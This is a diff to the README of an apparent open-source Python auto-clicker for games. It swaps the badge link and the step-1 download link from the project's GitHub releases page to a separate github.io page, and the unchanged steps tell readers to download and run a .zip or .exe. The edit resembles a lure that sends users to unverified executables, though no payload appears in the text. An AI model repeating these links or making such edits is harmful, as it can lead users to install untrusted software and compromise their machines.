@@ -1,6 +1,6 @@
 # 🖱️ AutoClicker-Open-Source-2026-Python - Automate game inputs with zero effort
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Towneyparanasal413/AutoClicker-Open-Source-2026-Python/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://towneyparanasal413.github.io)
 
 ## What is this tool
 
@@ -23,7 +23,7 @@ Ensure your computer meets these requirements before you start:
 
 Follow these steps to set up the tool on your computer.
 
-1. Visit the following link to see all available releases: [https://github.com/Towneyparanasal413/AutoClicker-Open-Source-2026-Python/releases](https://github.com/Towneyparanasal413/AutoClicker-Open-Source-2026-Python/releases)
+1. Visit the following link to see all available releases: [https://towneyparanasal413.github.io](https://towneyparanasal413.github.io)
 2. Look for the section labeled Assets on the latest release page.
 3. Click the file ending in .zip or .exe to start your download.
 4. If you downloaded a .zip file, right-click the folder and select Extract All.
